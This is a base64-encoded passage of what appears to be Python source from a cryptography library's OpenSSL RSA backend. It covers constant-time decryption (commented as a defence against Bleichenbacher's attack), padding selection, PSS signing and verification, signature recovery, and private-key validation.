JLiBTZWUgQmxlaWNoZW5iYWNoZXJcJ3MgXCc5OCBhdHRhY2sgb24gUlNBLCBhbmQgaXRzIG1hbnkgbWFueSB2YXJpYW50cy5cclxuICAgICMgQXMgc3VjaCwgeW91IHNob3VsZCBub3QgYXR0ZW1wdCB0byBjaGFuZ2UgdGhpcyAocGFydGljdWxhcmx5IHRvICJjbGVhbiBpdFxyXG4gICAgIyB1cCIpIHdpdGhvdXQgdW5kZXJzdGFuZGluZyB3aHkgaXQgd2FzIHdyaXR0ZW4gdGhpcyB3YXkgKHNlZVxyXG4gICAgIyBDaGVzdGVydG9uXCdzIEZlbmNlKSwgYW5kIHdpdGhvdXQgbWVhc3VyaW5nIHRvIHZlcmlmeSB5b3UgaGF2ZSBub3RcclxuICAgICMgaW50cm9kdWNlZCBvYnNlcnZhYmxlIHRpbWUgZGlmZmVyZW5jZXMuXHJcbiAgICByZXMgPSBjcnlwdChwa2V5X2N0eCwgYnVmLCBvdXRsZW4sIGRhdGEsIGxlbihkYXRhKSlcclxuICAgIHJlc2J1ZiA9IGJhY2tlbmQuX2ZmaS5idWZmZXIoYnVmKVs6IG91dGxlblswXV1cclxuICAgIGJhY2tlbmQuX2xpYi5FUlJfY2xlYXJfZXJyb3IoKVxyXG4gICAgaWYgcmVzIDw9IDA6XHJcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiRW5jcnlwdGlvbi9kZWNyeXB0aW9uIGZhaWxlZC4iKVxyXG4gICAgcmV0dXJuIHJlc2J1ZlxyXG5cclxuXHJcbmRlZiBfcnNhX3NpZ19kZXRlcm1pbmVfcGFkZGluZyhcclxuICAgIGJhY2tlbmQ6ICJCYWNrZW5kIixcclxuICAgIGtleTogdHlwaW5nLlVuaW9uWyJfUlNBUHJpdmF0ZUtleSIsICJfUlNBUHVibGljS2V5Il0sXHJcbiAgICBwYWRkaW5nOiBBc3ltbWV0cmljUGFkZGluZyxcclxuICAgIGFsZ29yaXRobTogdHlwaW5nLk9wdGlvbmFsW2hhc2hlcy5IYXNoQWxnb3JpdGhtXSxcclxuKSAtPiBpbnQ6XHJcbiAgICBpZiBub3QgaXNpbnN0YW5jZShwYWRkaW5nLCBBc3ltbWV0cmljUGFkZGluZyk6XHJcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJFeHBlY3RlZCBwcm92aWRlciBvZiBBc3ltbWV0cmljUGFkZGluZy4iKVxyXG5cclxuICAgIHBrZXlfc2l6ZSA9IGJhY2tlbmQuX2xpYi5FVlBfUEtFWV9zaXplKGtleS5fZXZwX3BrZXkpXHJcbiAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHBrZXlfc2l6ZSA+IDApXHJcblxyXG4gICAgaWYgaXNpbnN0YW5jZShwYWRkaW5nLCBQS0NTMXYxNSk6XHJcbiAgICAgICAgIyBIYXNoIGFsZ29yaXRobSBpcyBpZ25vcmVkIGZvciBQS0NTMXYxNS1wYWRkaW5nLCBtYXkgYmUgTm9uZS5cclxuICAgICAgICBwYWRkaW5nX2VudW0gPSBiYWNrZW5kLl9saWIuUlNBX1BLQ1MxX1BBRERJTkdcclxuICAgIGVsaWYgaXNpbnN0YW5jZShwYWRkaW5nLCBQU1MpOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHBhZGRpbmcuX21nZiwgTUdGMSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAgICAgIk9ubHkgTUdGMSBpcyBzdXBwb3J0ZWQgYnkgdGhpcyBiYWNrZW5kLiIsXHJcbiAgICAgICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9NR0YsXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgIyBQU1MgcGFkZGluZyByZXF1aXJlcyBhIGhhc2ggYWxnb3JpdGhtXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoYWxnb3JpdGhtLCBoYXNoZXMuSGFzaEFsZ29yaXRobSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiRXhwZWN0ZWQgaW5zdGFuY2Ugb2YgaGFzaGVzLkhhc2hBbGdvcml0aG0uIilcclxuXHJcbiAgICAgICAgIyBTaXplIG9mIGtleSBpbiBieXRlcyAtIDIgaXMgdGhlIG1heGltdW1cclxuICAgICAgICAjIFBTUyBzaWduYXR1cmUgbGVuZ3RoIChzYWx0IGxlbmd0aCBpcyBjaGVja2VkIGxhdGVyKVxyXG4gICAgICAgIGlmIHBrZXlfc2l6ZSAtIGFsZ29yaXRobS5kaWdlc3Rfc2l6ZSAtIDIgPCAwOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkRpZ2VzdCB0b28gbGFyZ2UgZm9yIGtleSBzaXplLiBVc2UgYSBsYXJnZXIgIlxyXG4gICAgICAgICAgICAgICAgImtleSBvciBkaWZmZXJlbnQgZGlnZXN0LiJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBwYWRkaW5nX2VudW0gPSBiYWNrZW5kLl9saWIuUlNBX1BLQ1MxX1BTU19QQURESU5HXHJcbiAgICBlbHNlOlxyXG4gICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAie30gaXMgbm90IHN1cHBvcnRlZCBieSB0aGlzIGJhY2tlbmQuIi5mb3JtYXQocGFkZGluZy5uYW1lKSxcclxuICAgICAgICAgICAgX1JlYXNvbnMuVU5TVVBQT1JURURfUEFERElORyxcclxuICAgICAgICApXHJcblxyXG4gICAgcmV0dXJuIHBhZGRpbmdfZW51bVxyXG5cclxuXHJcbiMgSGFzaCBhbGdvcml0aG0gY2FuIGJlIGFic2VudCAoTm9uZSkgdG8gaW5pdGlhbGl6ZSB0aGUgY29udGV4dCB3aXRob3V0IHNldHRpbmdcclxuIyBhbnkgbWVzc2FnZSBkaWdlc3QgYWxnb3JpdGhtLiBUaGlzIGlzIGN1cnJlbnRseSBvbmx5IHZhbGlkIGZvciB0aGUgUEtDUzF2MTVcclxuIyBwYWRkaW5nIHR5cGUsIHdoZXJlIGl0IG1lYW5zIHRoYXQgdGhlIHNpZ25hdHVyZSBkYXRhIGlzIGVuY29kZWQvZGVjb2RlZFxyXG4jIGFzIHByb3ZpZGVkLCB3aXRob3V0IGJlaW5nIHdyYXBwZWQgaW4gYSBEaWdlc3RJbmZvIHN0cnVjdHVyZS5cclxuZGVmIF9yc2Ffc2lnX3NldHVwKFxyXG4gICAgYmFja2VuZDogIkJhY2tlbmQiLFxyXG4gICAgcGFkZGluZzogQXN5bW1ldHJpY1BhZGRpbmcsXHJcbiAgICBhbGdvcml0aG06IHR5cGluZy5PcHRpb25hbFtoYXNoZXMuSGFzaEFsZ29yaXRobV0sXHJcbiAgICBrZXk6IHR5cGluZy5VbmlvblsiX1JTQVB1YmxpY0tleSIsICJfUlNBUHJpdmF0ZUtleSJdLFxyXG4gICAgaW5pdF9mdW5jOiB0eXBpbmcuQ2FsbGFibGVbW3R5cGluZy5BbnldLCBpbnRdLFxyXG4pOlxyXG4gICAgcGFkZGluZ19lbnVtID0gX3JzYV9zaWdfZGV0ZXJtaW5lX3BhZGRpbmcoYmFja2VuZCwga2V5LCBwYWRkaW5nLCBhbGdvcml0aG0pXHJcbiAgICBwa2V5X2N0eCA9IGJhY2tlbmQuX2xpYi5FVlBfUEtFWV9DVFhfbmV3KGtleS5fZXZwX3BrZXksIGJhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChwa2V5X2N0eCAhPSBiYWNrZW5kLl9mZmkuTlVMTClcclxuICAgIHBrZXlfY3R4ID0gYmFja2VuZC5fZmZpLmdjKHBrZXlfY3R4LCBiYWNrZW5kLl9saWIuRVZQX1BLRVlfQ1RYX2ZyZWUpXHJcbiAgICByZXMgPSBpbml0X2Z1bmMocGtleV9jdHgpXHJcbiAgICBpZiByZXMgIT0gMTpcclxuICAgICAgICBlcnJvcnMgPSBiYWNrZW5kLl9jb25zdW1lX2Vycm9ycygpXHJcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVW5hYmxlIHRvIHNpZ24vdmVyaWZ5IHdpdGggdGhpcyBrZXkiLCBlcnJvcnMpXHJcblxyXG4gICAgaWYgYWxnb3JpdGhtIGlzIG5vdCBOb25lOlxyXG4gICAgICAgIGV2cF9tZCA9IGJhY2tlbmQuX2V2cF9tZF9ub25fbnVsbF9mcm9tX2FsZ29yaXRobShhbGdvcml0aG0pXHJcbiAgICAgICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9QS0VZX0NUWF9zZXRfc2lnbmF0dXJlX21kKHBrZXlfY3R4LCBldnBfbWQpXHJcbiAgICAgICAgaWYgcmVzIDw9IDA6XHJcbiAgICAgICAgICAgIGJhY2tlbmQuX2NvbnN1bWVfZXJyb3JzKClcclxuICAgICAgICAgICAgcmFpc2UgVW5zdXBwb3J0ZWRBbGdvcml0aG0oXHJcbiAgICAgICAgICAgICAgICAie30gaXMgbm90IHN1cHBvcnRlZCBieSB0aGlzIGJhY2tlbmQgZm9yIFJTQSBzaWduaW5nLiIuZm9ybWF0KFxyXG4gICAgICAgICAgICAgICAgICAgIGFsZ29yaXRobS5uYW1lXHJcbiAgICAgICAgICAgICAgICApLFxyXG4gICAgICAgICAgICAgICAgX1JlYXNvbnMuVU5TVVBQT1JURURfSEFTSCxcclxuICAgICAgICAgICAgKVxyXG4gICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9QS0VZX0NUWF9zZXRfcnNhX3BhZGRpbmcocGtleV9jdHgsIHBhZGRpbmdfZW51bSlcclxuICAgIGlmIHJlcyA8PSAwOlxyXG4gICAgICAgIGJhY2tlbmQuX2NvbnN1bWVfZXJyb3JzKClcclxuICAgICAgICByYWlzZSBVbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgInt9IGlzIG5vdCBzdXBwb3J0ZWQgZm9yIHRoZSBSU0Egc2lnbmF0dXJlIG9wZXJhdGlvbi4iLmZvcm1hdChcclxuICAgICAgICAgICAgICAgIHBhZGRpbmcubmFtZVxyXG4gICAgICAgICAgICApLFxyXG4gICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9QQURESU5HLFxyXG4gICAgICAgIClcclxuICAgIGlmIGlzaW5zdGFuY2UocGFkZGluZywgUFNTKTpcclxuICAgICAgICBhc3NlcnQgaXNpbnN0YW5jZShhbGdvcml0aG0sIGhhc2hlcy5IYXNoQWxnb3JpdGhtKVxyXG4gICAgICAgIHJlcyA9IGJhY2tlbmQuX2xpYi5FVlBfUEtFWV9DVFhfc2V0X3JzYV9wc3Nfc2FsdGxlbihcclxuICAgICAgICAgICAgcGtleV9jdHgsXHJcbiAgICAgICAgICAgIF9nZXRfcnNhX3Bzc19zYWx0X2xlbmd0aChiYWNrZW5kLCBwYWRkaW5nLCBrZXksIGFsZ29yaXRobSksXHJcbiAgICAgICAgKVxyXG4gICAgICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID4gMClcclxuXHJcbiAgICAgICAgbWdmMV9tZCA9IGJhY2tlbmQuX2V2cF9tZF9ub25fbnVsbF9mcm9tX2FsZ29yaXRobShcclxuICAgICAgICAgICAgcGFkZGluZy5fbWdmLl9hbGdvcml0aG1cclxuICAgICAgICApXHJcbiAgICAgICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9QS0VZX0NUWF9zZXRfcnNhX21nZjFfbWQocGtleV9jdHgsIG1nZjFfbWQpXHJcbiAgICAgICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPiAwKVxyXG5cclxuICAgIHJldHVybiBwa2V5X2N0eFxyXG5cclxuXHJcbmRlZiBfcnNhX3NpZ19zaWduKFxyXG4gICAgYmFja2VuZDogIkJhY2tlbmQiLFxyXG4gICAgcGFkZGluZzogQXN5bW1ldHJpY1BhZGRpbmcsXHJcbiAgICBhbGdvcml0aG06IGhhc2hlcy5IYXNoQWxnb3JpdGhtLFxyXG4gICAgcHJpdmF0ZV9rZXk6ICJfUlNBUHJpdmF0ZUtleSIsXHJcbiAgICBkYXRhOiBieXRlcyxcclxuKSAtPiBieXRlczpcclxuICAgIHBrZXlfY3R4ID0gX3JzYV9zaWdfc2V0dXAoXHJcbiAgICAgICAgYmFja2VuZCxcclxuICAgICAgICBwYWRkaW5nLFxyXG4gICAgICAgIGFsZ29yaXRobSxcclxuICAgICAgICBwcml2YXRlX2tleSxcclxuICAgICAgICBiYWNrZW5kLl9saWIuRVZQX1BLRVlfc2lnbl9pbml0LFxyXG4gICAgKVxyXG4gICAgYnVmbGVuID0gYmFja2VuZC5fZmZpLm5ldygic2l6ZV90ICoiKVxyXG4gICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9QS0VZX3NpZ24oXHJcbiAgICAgICAgcGtleV9jdHgsIGJhY2tlbmQuX2ZmaS5OVUxMLCBidWZsZW4sIGRhdGEsIGxlbihkYXRhKVxyXG4gICAgKVxyXG4gICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgIGJ1ZiA9IGJhY2tlbmQuX2ZmaS5uZXcoInVuc2lnbmVkIGNoYXJbXSIsIGJ1ZmxlblswXSlcclxuICAgIHJlcyA9IGJhY2tlbmQuX2xpYi5FVlBfUEtFWV9zaWduKHBrZXlfY3R4LCBidWYsIGJ1ZmxlbiwgZGF0YSwgbGVuKGRhdGEpKVxyXG4gICAgaWYgcmVzICE9IDE6XHJcbiAgICAgICAgZXJyb3JzID0gYmFja2VuZC5fY29uc3VtZV9lcnJvcnNfd2l0aF90ZXh0KClcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAiRGlnZXN0IG9yIHNhbHQgbGVuZ3RoIHRvbyBsb25nIGZvciBrZXkgc2l6ZS4gVXNlIGEgbGFyZ2VyIGtleSAiXHJcbiAgICAgICAgICAgICJvciBzaG9ydGVyIHNhbHQgbGVuZ3RoIGlmIHlvdSBhcmUgc3BlY2lmeWluZyBhIFBTUyBzYWx0IixcclxuICAgICAgICAgICAgZXJyb3JzLFxyXG4gICAgICAgIClcclxuXHJcbiAgICByZXR1cm4gYmFja2VuZC5fZmZpLmJ1ZmZlcihidWYpWzpdXHJcblxyXG5cclxuZGVmIF9yc2Ffc2lnX3ZlcmlmeShcclxuICAgIGJhY2tlbmQ6ICJCYWNrZW5kIixcclxuICAgIHBhZGRpbmc6IEFzeW1tZXRyaWNQYWRkaW5nLFxyXG4gICAgYWxnb3JpdGhtOiBoYXNoZXMuSGFzaEFsZ29yaXRobSxcclxuICAgIHB1YmxpY19rZXk6ICJfUlNBUHVibGljS2V5IixcclxuICAgIHNpZ25hdHVyZTogYnl0ZXMsXHJcbiAgICBkYXRhOiBieXRlcyxcclxuKSAtPiBOb25lOlxyXG4gICAgcGtleV9jdHggPSBfcnNhX3NpZ19zZXR1cChcclxuICAgICAgICBiYWNrZW5kLFxyXG4gICAgICAgIHBhZGRpbmcsXHJcbiAgICAgICAgYWxnb3JpdGhtLFxyXG4gICAgICAgIHB1YmxpY19rZXksXHJcbiAgICAgICAgYmFja2VuZC5fbGliLkVWUF9QS0VZX3ZlcmlmeV9pbml0LFxyXG4gICAgKVxyXG4gICAgcmVzID0gYmFja2VuZC5fbGliLkVWUF9QS0VZX3ZlcmlmeShcclxuICAgICAgICBwa2V5X2N0eCwgc2lnbmF0dXJlLCBsZW4oc2lnbmF0dXJlKSwgZGF0YSwgbGVuKGRhdGEpXHJcbiAgICApXHJcbiAgICAjIFRoZSBwcmV2aW91cyBjYWxsIGNhbiByZXR1cm4gbmVnYXRpdmUgbnVtYmVycyBpbiB0aGUgZXZlbnQgb2YgYW5cclxuICAgICMgZXJyb3IuIFRoaXMgaXMgbm90IGEgc2lnbmF0dXJlIGZhaWx1cmUgYnV0IHdlIG5lZWQgdG8gZmFpbCBpZiBpdFxyXG4gICAgIyBvY2N1cnMuXHJcbiAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyA+PSAwKVxyXG4gICAgaWYgcmVzID09IDA6XHJcbiAgICAgICAgYmFja2VuZC5fY29uc3VtZV9lcnJvcnMoKVxyXG4gICAgICAgIHJhaXNlIEludmFsaWRTaWduYXR1cmVcclxuXHJcblxyXG5kZWYgX3JzYV9zaWdfcmVjb3ZlcihcclxuICAgIGJhY2tlbmQ6ICJCYWNrZW5kIixcclxuICAgIHBhZGRpbmc6IEFzeW1tZXRyaWNQYWRkaW5nLFxyXG4gICAgYWxnb3JpdGhtOiB0eXBpbmcuT3B0aW9uYWxbaGFzaGVzLkhhc2hBbGdvcml0aG1dLFxyXG4gICAgcHVibGljX2tleTogIl9SU0FQdWJsaWNLZXkiLFxyXG4gICAgc2lnbmF0dXJlOiBieXRlcyxcclxuKSAtPiBieXRlczpcclxuICAgIHBrZXlfY3R4ID0gX3JzYV9zaWdfc2V0dXAoXHJcbiAgICAgICAgYmFja2VuZCxcclxuICAgICAgICBwYWRkaW5nLFxyXG4gICAgICAgIGFsZ29yaXRobSxcclxuICAgICAgICBwdWJsaWNfa2V5LFxyXG4gICAgICAgIGJhY2tlbmQuX2xpYi5FVlBfUEtFWV92ZXJpZnlfcmVjb3Zlcl9pbml0LFxyXG4gICAgKVxyXG5cclxuICAgICMgQXR0ZW1wdCB0byBrZWVwIHRoZSByZXN0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gYXMgY29uc3RhbnQvdGltZVxyXG4gICAgIyBhcyBwb3NzaWJsZS4gU2VlIHRoZSBjb21tZW50IGluIF9lbmNfZGVjX3JzYV9wa2V5X2N0eC4gTm90ZSB0aGF0IHRoZVxyXG4gICAgIyBidWZsZW4gcGFyYW1ldGVyIGlzIHVzZWQgZXZlbiB0aG91Z2ggaXRzIHZhbHVlIG1heSBiZSB1bmRlZmluZWQgaW4gdGhlXHJcbiAgICAjIGVycm9yIGNhc2UuIER1ZSB0byB0aGUgdG9sZXJhbnQgbmF0dXJlIG9mIFB5dGhvbiBzbGljaW5nIHRoaXMgZG9lcyBub3RcclxuICAgICMgdHJpZ2dlciBhbnkgZXhjZXB0aW9ucy5cclxuICAgIG1heGxlbiA9IGJhY2tlbmQuX2xpYi5FVlBfUEtFWV9zaXplKHB1YmxpY19rZXkuX2V2cF9wa2V5KVxyXG4gICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChtYXhsZW4gPiAwKVxyXG4gICAgYnVmID0gYmFja2VuZC5fZmZpLm5ldygidW5zaWduZWQgY2hhcltdIiwgbWF4bGVuKVxyXG4gICAgYnVmbGVuID0gYmFja2VuZC5fZmZpLm5ldygic2l6ZV90ICoiLCBtYXhsZW4pXHJcbiAgICByZXMgPSBiYWNrZW5kLl9saWIuRVZQX1BLRVlfdmVyaWZ5X3JlY292ZXIoXHJcbiAgICAgICAgcGtleV9jdHgsIGJ1ZiwgYnVmbGVuLCBzaWduYXR1cmUsIGxlbihzaWduYXR1cmUpXHJcbiAgICApXHJcbiAgICByZXNidWYgPSBiYWNrZW5kLl9mZmkuYnVmZmVyKGJ1ZilbOiBidWZsZW5bMF1dXHJcbiAgICBiYWNrZW5kLl9saWIuRVJSX2NsZWFyX2Vycm9yKClcclxuICAgICMgQXNzdW1lIHRoYXQgYWxsIHBhcmFtZXRlciBlcnJvcnMgYXJlIGhhbmRsZWQgZHVyaW5nIHRoZSBzZXR1cCBwaGFzZSBhbmRcclxuICAgICMgYW55IGVycm9yIGhlcmUgaXMgZHVlIHRvIGludmFsaWQgc2lnbmF0dXJlLlxyXG4gICAgaWYgcmVzICE9IDE6XHJcbiAgICAgICAgcmFpc2UgSW52YWxpZFNpZ25hdHVyZVxyXG4gICAgcmV0dXJuIHJlc2J1ZlxyXG5cclxuXHJcbmNsYXNzIF9SU0FQcml2YXRlS2V5KFJTQVByaXZhdGVLZXkpOlxyXG4gICAgX2V2cF9wa2V5OiBvYmplY3RcclxuICAgIF9yc2FfY2RhdGE6IG9iamVjdFxyXG4gICAgX2tleV9zaXplOiBpbnRcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgYmFja2VuZDogIkJhY2tlbmQiLCByc2FfY2RhdGEsIGV2cF9wa2V5LCBfc2tpcF9jaGVja19rZXk6IGJvb2xcclxuICAgICk6XHJcbiAgICAgICAgcmVzOiBpbnRcclxuICAgICAgICAjIFJTQV9jaGVja19rZXkgaXMgc2xvd2VyIGluIE9wZW5TU0wgMy4wLjAgZHVlIHRvIGltcHJvdmVkXHJcbiAgICAgICAgIyBwcmltYWxpdHkgY2hlY2tpbmcuIEluIG5vcm1hbCB1c2UgdGhpcyBpcyB1bmxpa2VseSB0byBiZSBhIHByb2JsZW1cclxuICAgICAgICAjIHNpbmNlIHVzZXJzIGRvblwndCBsb2FkIG5ldyBrZXlzIGNvbnN0YW50bHksIGJ1dCBmb3IgVEVTVElORyB3ZVwndmVcclxuICAgICAgICAjIGFkZGVkIGFuIGluaXQgYXJnIHRoYXQgYWxsb3dzIHNraXBwaW5nIHRoZSBjaGVja3MuIFlvdSBzaG91bGQgbm90XHJcbiAgICAgICAgIyB1c2UgdGhpcyBpbiBwcm9kdWN0aW9uIGNvZGUgdW5sZXNzIHlvdSB1bmRlcnN0YW5kIHRoZSBjb25zZXF1ZW5jZXMuXHJcbiAgICAgICAgaWYgbm90IF9za2lwX2NoZWNrX2tleTpcclxuICAgICAgICAgICAgcmVzID0gYmFja2VuZC5fbGliLlJTQV9jaGVja19rZXkocnNhX2NkYXRhKVxyXG4gICAgICAgICAgICBpZiByZXMgIT0gMTpcclxuICAgICAgICAgICAgICAgIGVycm9ycyA9IGJhY2tlbmQuX2NvbnN1bWVfZXJyb3JzX3dpdGhfdGV4dCgpXHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJJbnZhbGlkIHByaXZhdGUga2V5IiwgZXJyb3JzKVxyXG4gICAgICAgICAgICAjIDIgaXMgcHJpbWUgYW5kIHBhc3NlcyBhbiBSU0Ega2V5IGNoZWNrLCBzbyB3ZSBhbHNvIGNoZWNrXHJcbiAgICAgICAgICAgICMgaWYgcCBhbmQgcSBhcmUgb2RkIGp1c3QgdG8gYmUgc2FmZS5cclxuICAgICAgICAgICAgcCA9IGJhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgICAgIHEgPSBiYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgICAgICBiYWNrZW5kLl9saWIuUlNBX2dldDBfZmFjdG9ycyhyc2FfY2RhdGEsIHAsIHEpXHJcbiAgICAgICAgICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQocFswXSAhPSBiYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICAgICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChxWzBdICE9IGJhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgICAgICBwX29kZCA9IGJhY2tlbmQuX2xpYi5CTl9pc19vZGQocFswXSlcclxuICAgICAgICAgICAgcV9vZGQgPSBiYWNrZW5kLl9saWIuQk5faXNfb2RkKHFbMF0pXHJcbiAgICAgICAgICAgIGlmIHBfb2RkICE9IDEgb3IgcV9vZGQgIT0gMTpcclxuICAgICAgICAgICAgICAgIGVycm9ycyA9IGJhY2tlbmQuX2NvbnN1bWVfZXJyb3JzX3dpdGhfdGV4dCgpXHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJJbnZhbGlkIHByaXZhdGUga2V5IiwgZXJyb3JzKVxyXG5cclxuICAgICAgICAjIEJsaW5kaW5nIGlzIG9uIGJ5IGRlZmF1bHQgaW4gbWFueSB2ZXJzaW9ucyBvZiBPcGVuU1NMLCBidXQgbGV0XCdzXHJcbiAgICAgICAgIyBqdXN0IGJlIGNvbnNlcnZhdGl2ZSBoZXJlLlxyXG4gICAgICAgIHJlcyA9IGJhY2tlbmQuX2xpYi5SU0FfYmxpbmRpbmdfb24ocnNhX2NkYXRhLCBiYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG5cclxuICAgICAgICBzZWxmLl9iYWNrZW5kID0gYmFja2VuZFxyXG4gICAgICAgIHNlbGYuX3JzYV9jZGF0YSA9IHJzYV9jZGF0YVxyXG4gICAgICAgIHNlbGYuX2V2cF9wa2V5ID0gZXZwX3BrZXlcclxuXHJcbiAgICAgICAgbiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5fbGliLlJTQV9nZXQwX2tleShcclxuICAgICAgICAgICAgc2VsZi5fcnNhX2NkYXRhLFxyXG4gICAgICAgICAgICBuLFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoblswXSAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBzZWxmLl9rZXlfc2l6ZSA9IHNlbGYuX2JhY2tlbmQuX2xpYi5CTl9udW1fYml0cyhuWzBdKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGtleV9zaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fa2V5X3NpemVcclxuXHJcbiAgICBkZWYgZGVjcnlwdChzZWxmLCBjaXBoZXJ0ZXh0OiBieXRlcywgcGFkZGluZzogQXN5bW1ldHJpY1BhZGRpbmcpIC0+IGJ5dGVzOlxyXG4gICAgICAgIGtleV9zaXplX2J5dGVzID0gKHNlbGYua2V5X3NpemUgKyA3KSAvLyA4XHJcbiAgICAgICAgaWYga2V5X3NpemVfYnl0ZXMgIT0gbGVuKGNpcGhlcnRleHQpOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJDaXBoZXJ0ZXh0IGxlbmd0aCBtdXN0IGJlIGVxdWFsIHRvIGtleSBzaXplLiIpXHJcblxyXG4gICAgICAgIHJldHVybiBfZW5jX2RlY19yc2Eoc2VsZi5fYmFja2VuZCwgc2VsZiwgY2lwaGVydGV4dCwgcGFkZGluZylcclxuXHJcbiAgICBkZWYgcHVibGljX2tleShzZWxmKSAtPiBSU0FQdWJsaWNLZXk6XHJcbiAgICAgICAgY3R4ID0gc2VsZi5fYmFja2VuZC5fbGliLlJTQVB1YmxpY0tleV9kdXAoc2VsZi5fcnNhX2NkYXRhKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoY3R4ICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGN0eCA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5nYyhjdHgsIHNlbGYuX2JhY2tlbmQuX2xpYi5SU0FfZnJlZSlcclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2JhY2tlbmQuX3JzYV9jZGF0YV90b19ldnBfcGtleShjdHgpXHJcbiAgICAgICAgcmV0dXJuIF9SU0FQdWJsaWNLZXkoc2VsZi5fYmFja2VuZCwgY3R4LCBldnBfcGtleSlcclxuXHJcbiAgICBkZWYgcHJpdmF0ZV9udW1iZXJzKHNlbGYpIC0+IFJTQVByaXZhdGVOdW1iZXJzOlxyXG4gICAgICAgIG4gPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIGUgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIGQgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHAgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHEgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIGRtcDEgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIGRtcTEgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIGlxbXAgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQuX2xpYi5SU0FfZ2V0MF9rZXkoc2VsZi5fcnNhX2NkYXRhLCBuLCBlLCBkKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoblswXSAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KGVbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChkWzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQuX2xpYi